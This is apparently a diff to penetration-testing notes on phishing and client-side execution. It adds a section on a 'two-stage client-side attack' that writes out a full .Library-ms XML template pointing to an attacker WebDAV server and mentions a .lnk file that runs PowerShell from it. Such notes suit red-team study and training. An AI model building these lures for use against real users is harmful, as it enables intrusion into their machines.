@@ -62,7 +62,6 @@ SIM swapping
 ## Execution
 office macros
 exe, scr, hta, jscript files
-Library-ms file (link to webdav)
 exploits
 links that force NTLM handshakes or perform CSRF
 browser-in-the-middle
@@ -72,6 +71,38 @@ target fingerprinting
 ```bash
 wget -E -k -K -p -e robots=off -H -D DOMAIN -nd URL
 ```
+
+### Library-ms File
+two-stage client-side attack
+Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. The parts are _General library information_, _Library properties_, and _Library locations_
+<https://docs.microsoft.com/en-us/windows/win32/shell/library-schema-entry>
+
+- Execution
+`.Library-ms` file:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://0.0.0.0:80</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+.lnk file executing a powershell command on our webdav server
 
 ## Mitigation
 email filtering
